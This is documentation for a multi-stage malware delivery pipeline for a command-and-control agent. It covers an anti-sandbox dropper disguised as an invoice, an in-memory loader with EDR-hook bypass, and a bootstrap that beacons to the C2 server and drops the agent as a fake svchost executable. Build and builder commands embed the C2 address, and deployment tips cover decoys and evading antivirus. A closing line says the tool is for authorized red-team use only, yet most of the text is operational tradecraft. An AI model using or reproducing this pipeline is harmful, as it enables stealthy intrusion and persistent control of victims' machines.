# Multi-Stage Execution Pipeline

## Overview

The C2R2-v2 staging system is a multi-stage execution pipeline inspired by IRIS C2, designed to provide a layered approach to agent deployment with strong separation of concerns and enhanced OPSEC.

## Architecture

The staging system consists of three distinct stages, each with a specific responsibility:

```
┌─────────────────────────────────────────────────────────────┐
│                        Stage Flow                            │
└─────────────────────────────────────────────────────────────┘

                     Initial Execution
                            │
                            ▼
        ┌──────────────────────────────────────┐
        │  Stage 1: ESTER (Dropper/Installer)  │
        │                                      │
        │  - Environment validation            │
        │  - Sandbox/VM detection              │
        │  - Legitimate behavior simulation    │
        │  - NO C2 communication               │
        │  - Runs on disk (unavoidable)        │
        └──────────────┬───────────────────────┘
                       │ Triggers
                       ▼
        ┌──────────────────────────────────────┐
        │  Stage 2: JAVELIN (Memory Loader)    │
        │                                      │
        │  - Runs entirely in memory           │
        │  - XOR/AES payload decryption        │
        │  - RW → RX memory transitions        │
        │  - Artifact cleanup                  │
        │  - NO C2 communication               │
        │  - Loads Stage 3                     │
        └──────────────┬───────────────────────┘
                       │ Executes
                       ▼
        ┌──────────────────────────────────────┐
        │  Stage 3: Stage0 (Bootstrap)         │
        │                                      │
        │  - Position-independent code         │
        │  - Initial C2 beacon                 │
        │  - TLS session establishment         │
        │  - Full agent download               │
        │  - Agent execution in memory         │
        └──────────────┬───────────────────────┘
                       │ Downloads & Executes
                       ▼
        ┌──────────────────────────────────────┐
        │  Full Agent (Existing C2R2-v2 Agent) │
        │                                      │
        │  - All agent capabilities            │
        │  - Beacon loop                       │
        │  - Command execution                 │
        │  - Module loading                    │
        └──────────────────────────────────────┘
```

## Stage Details

### Stage 1: ESTER (Entry Stage - Trojan Execution Relay)

**Location**: `stages/ester/`

**Purpose**: Initial dropper/installer wrapper that validates the environment before proceeding.

**Key Characteristics**:
- ✅ Minimal disk footprint (unavoidable as entry point)
- ✅ Appears as legitimate software (can masquerade as PDF, installer, etc.)
- ✅ Performs environment validation
- ✅ NO direct C2 communication
- ✅ NO payload execution (only triggers Stage 2)

**Environment Checks** (Production mode only):
- CPU core count (sandboxes typically have < 2 cores)
- Physical memory (sandboxes typically have < 4GB)
- Debugger detection
- System uptime (sandboxes often have < 10 minutes)

**Why ESTER exists**:
- Provides plausible deniability (looks like broken/legitimate software)
- Wastes sandbox analysis time without revealing capabilities
- Can be configured to show fake error messages
- Only proceeds if environment appears legitimate

**Execution Flow**:
1. Anti-sandbox delay (3 seconds)
2. Environment validation checks
3. Human-like random delay (1-3 seconds)
4. Decrypt and execute JAVELIN (Stage 2) in memory
5. Exit

**OPSEC Trade-offs**:
- ✅ Minimal suspicious behavior
- ✅ Can pass initial static analysis
- ❌ Must run on disk (unavoidable as entry point)
- ✅ No network activity
- ✅ Small binary size (~50KB)

### Stage 2: JAVELIN (Java-like Adaptive Vanguard Execution Loader In-memory)

**Location**: `stages/javelin/`

**Purpose**: In-memory loader that decrypts and executes Stage 3.

**Key Characteristics**:
- ✅ Runs entirely in memory (never touches disk)
- ✅ XOR/AES payload decryption
- ✅ RW → RX memory protection transitions (OPSEC-friendly)
- ✅ Secure memory zeroing after use
- ✅ NO C2 communication
- ✅ NO full agent capabilities

**Memory Management**:
- Allocates memory as `PAGE_READWRITE` (RW)
- Copies decrypted payload to memory
- Transitions to `PAGE_EXECUTE_READ` (RX)
- More OPSEC-friendly than direct `PAGE_EXECUTE_READWRITE` (RWX)

**Cryptography**:
- XOR encryption (fast, minimal dependencies)
- AES-256-GCM support (optional, for stronger security)
- Same algorithms as builder and dropper-rust (consistency)

**Why JAVELIN exists**:
- Separates environment validation (ESTER) from payload execution
- Keeps ESTER small and clean
- Provides a reusable loader infrastructure
- Can be updated independently from Stage 1

**Execution Flow**:
1. Decrypt embedded Stage0 payload (XOR)
2. Allocate RW memory
3. Copy payload to memory
4. Transition memory to RX
5. Execute Stage0
6. Zero memory for cleanup

**OPSEC Trade-offs**:
- ✅ Entirely in-memory (no disk artifacts)
- ✅ RW → RX transitions (less suspicious)
- ✅ Memory cleanup after execution
- ❌ Requires VirtualAlloc/VirtualProtect (can be monitored by EDR)
- ✅ No network activity
- ✅ Indirect syscalls via dinvk (bypasses userland hooks)

### Stage 3: Stage0 (Bootstrap Payload)

**Location**: `stages/stage0/`

**Purpose**: Minimal bootstrap that contacts C2 and downloads the full agent.

**Key Characteristics**:
- ✅ Position-independent code (no fixed addresses)
- ✅ Minimal network signature (single beacon + download)
- ✅ TLS encrypted communication
- ✅ Downloads full agent on demand via HTTP API
- ✅ Executes agent as separate process

**C2 Protocol**:
1. Initial beacon: `STAGE0_BEACON|hostname|username|os` (TCP)
2. TLS session establishment for verification
3. HTTP GET `/api/stage0/agent` (port 5555)
4. Response format: `key_len(4) + key + size(4) + XOR_encrypted_agent`
5. XOR decrypt agent bytes
6. Write to `%TEMP%\svchost_XXXXX.exe`
7. Spawn agent as detached process

**Why Stage0 exists**:
- Keeps earlier stages generic and C2-independent
- Only Stage0 needs C2 address configuration
- Full agent downloaded only after successful bootstrap
- Can be updated independently from ESTER/JAVELIN

**Execution Flow**:
1. Send initial beacon to C2
2. Establish TLS session (verification)
3. HTTP GET to download XOR-encrypted agent
4. Decrypt agent bytes
5. Write agent to temp directory
6. Spawn agent as detached process
7. Exit (agent continues running)

**OPSEC Trade-offs**:
- ✅ Position-independent (can run from any memory location)
- ✅ TLS encrypted beacon
- ✅ XOR encrypted agent download
- ✅ Agent runs as separate process (survives Stage0 exit)
- ❌ Agent written to disk (required for complex Rust binaries)
- ❌ Network activity (unavoidable for agent download)

## Separation of Responsibilities

| Stage | C2 Communication | Payload Execution | Environment Checks | Disk Activity |
|-------|------------------|-------------------|-------------------|---------------|
| ESTER | ❌ None          | ❌ No (triggers only) | ✅ Yes          | ✅ Yes (entry point) |
| JAVELIN | ❌ None        | ✅ Yes (Stage0)   | ❌ No             | ❌ No (memory only) |
| Stage0 | ✅ Yes          | ✅ Yes (full agent) | ❌ No           | ❌ No (memory only) |
| Full Agent | ✅ Yes      | ✅ Yes (commands)  | ✅ Yes (advanced) | ⚠️ Optional (modules) |

## Building the Stages

### Prerequisites

Same as the main agent:
- Rust 1.70+
- MinGW-w64 (for Windows cross-compilation)
- x86_64-pc-windows-gnu target

### Build Commands

```bash
# Build all stages (development mode with console)
cargo build -p ester
cargo build -p javelin
cargo build -p stage0

# Build for production (no console, fully stealthy)
cargo build --release --target x86_64-pc-windows-gnu --no-default-features --features production -p ester
cargo build --release --target x86_64-pc-windows-gnu --no-default-features --features production -p javelin
cargo build --release --target x86_64-pc-windows-gnu --no-default-features --features production -p stage0
```

### Builder Integration

The builder needs to be extended to support stage generation:

```bash
# Generate a complete staged payload
./builder build-staged \
    --name staged-agent \
    --server 192.168.1.10:4444 \
    --production

# This would:
# 1. Build Stage0 with embedded C2 address
# 2. Encrypt Stage0 with random XOR key
# 3. Build JAVELIN with embedded encrypted Stage0
# 4. Encrypt JAVELIN with random XOR key
# 5. Build ESTER with embedded encrypted JAVELIN
# 6. Output: staged-agent.exe
```

## Usage Examples

### Scenario 1: Targeted Deployment

When you want maximum OPSEC and can customize the initial dropper:

```bash
# 1. Build staged agent
cargo build --release --target x86_64-pc-windows-gnu --features production -p ester

# 2. Rename to look legitimate
mv target/x86_64-pc-windows-gnu/release/ester.exe "Invoice_2024.exe"

# 3. Set PDF icon (optional)
# Use resource hacker or build.rs

# 4. Deploy to target
# ESTER will validate environment and only proceed if legitimate
```

### Scenario 2: Quick Testing

For testing the staging pipeline in development:

```bash
# Build all stages in dev mode (with console output)
cargo build -p ester -p javelin -p stage0

# Run ESTER
./target/debug/ester.exe

# You'll see debug output:
# [ESTER] Stage 1 initializing...
# [ESTER] Dev mode - skipping checks
# [ESTER] Triggering Stage 2 (JAVELIN)...
# [JAVELIN] Stage 2 initializing...
# [JAVELIN] Loading Stage 3 (Stage0)...
# [STAGE0] Bootstrap payload initializing...
# [STAGE0] Sending initial beacon...
```

### Scenario 3: Direct Stage Testing

You can test individual stages:

```bash
# Test JAVELIN standalone
cargo run -p javelin

# Test Stage0 standalone
cargo run -p stage0

# Test ESTER standalone
cargo run -p ester
```

## OPSEC Considerations

### What Runs on Disk vs Memory

| Component | Disk | Memory | Network |
|-----------|------|--------|---------|
| ESTER | ✅ Yes | - | ❌ No |
| JAVELIN | ❌ No | ✅ Yes | ❌ No |
| Stage0 | ❌ No | ✅ Yes | ✅ Yes (TLS + HTTP) |
| Full Agent | ✅ Yes (temp) | ✅ Yes | ✅ Yes (TLS) |

> **Note**: The full agent is written to `%TEMP%\svchost_XXXXX.exe` before execution.
> This is required because complex Rust binaries with TLS/threads cannot run reliably as pure shellcode.
> The temp file is spawned as a detached process, allowing Stage0 to exit cleanly.

### Detection Surface

**Static Analysis (Disk)**:
- ESTER only (small, can be obfuscated)
- No direct C2 logic in ESTER
- No suspicious strings in ESTER

**Dynamic Analysis (Memory)**:
- VirtualAlloc/VirtualProtect calls (monitored by EDR)
- Network activity only from Stage0 onward
- TLS encryption makes traffic analysis harder

**Behavioral Analysis**:
- Anti-sandbox checks in ESTER (can trigger alerts)
- Memory allocation patterns (RW → RX is common)
- Network beaconing (once Stage0 executes)

### Best Practices

1. **Always use production builds for real deployments**
   - No console window
   - No debug prints
   - Anti-sandbox checks enabled

2. **Customize ESTER for each operation**
   - Change icon to match cover story
   - Modify metadata (company name, version, etc.)
   - Add fake error messages

3. **Vary staging timing**
   - Adjust delays between stages
   - Add jitter to network timing
   - Randomize beacon intervals

4. **Monitor for detection**
   - Test in sandbox before deployment
   - Check if stages trigger AV/EDR
   - Adjust techniques as needed

## Integration with Existing C2R2-v2

The staging system integrates seamlessly with the existing C2R2-v2 infrastructure:

- ✅ Uses same TLS configuration as agent
- ✅ Uses same crypto algorithms (XOR, AES)
- ✅ Compatible with existing C2 server
- ✅ No changes needed to C2 server code
- ✅ Full agent has all existing capabilities

## Future Enhancements

### Planned Features

1. **Download-based staging**
   - ESTER downloads JAVELIN from URL
   - Keeps ESTER even smaller
   - More flexible but less stealthy

2. **AES-256-GCM encryption**
   - Stronger than XOR
   - Optional for high-value targets
   - Increases binary size

3. **Key exchange protocol**
   - Diffie-Hellman key exchange
   - Enhances security over TLS
   - Protects against TLS interception

4. **Process injection**
   - Stage0 injects into legitimate process
   - Enhanced stealth
   - More complex implementation

5. **Chunked downloads**
   - Download agent in chunks
   - Resilient to network interruptions
   - Can resume downloads

## Troubleshooting

### ESTER exits immediately

**Cause**: Environment checks failed (production mode)

**Solution**:
- Build in dev mode for testing: `cargo build -p ester`
- Check system meets requirements (2+ cores, 4+ GB RAM, 10+ min uptime)
- Disable checks by using dev mode

### JAVELIN fails to load Stage0

**Cause**: No Stage0 payload embedded

**Solution**:
- Ensure Stage0 is built and encrypted
- Check builder configuration
- Verify embedded payload in binary

### Stage0 fails to connect to C2

**Cause**: C2 server not running or unreachable

**Solution**:

- Verify C2 server is running: `./c2r2-server --bind 0.0.0.0 --port 4444`
- Check firewall rules (ports 4444 for TLS, 5555 for HTTP API)
- Verify C2_SERVER address in Stage0 config

### Agent download fails

**Cause**: HTTP API endpoint not responding

**Solution**:

- Ensure `agent.exe` exists in C2 server directory
- Verify HTTP API is running on port 5555
- Check C2 server logs for errors
- Verify XOR encryption key matches (`C2R2_STAGE0_AGENT_KEY_2026`)

## Security Warnings

⚠️ **LEGAL DISCLAIMER**: This staging system is for authorized penetration testing and red team operations only.

- Always obtain written permission before deployment
- Test in controlled environments first
- Be aware of detection signatures
- Use responsibly and ethically

## Conclusion

The C2R2-v2 multi-stage execution pipeline provides:

✅ **Layered OPSEC** - Multiple stages of defense evasion
✅ **Clean Separation** - Each stage has a specific responsibility
✅ **Flexibility** - Can be customized for different scenarios
✅ **Compatibility** - Works with existing C2R2-v2 infrastructure
✅ **Maintainability** - Modular design for easy updates

For more information, see:
- [Architecture Documentation](ARCHITECTURE.md)
- [Development Guide](DEVELOPMENT.md)
- [Security Guide](SECURITY.md)
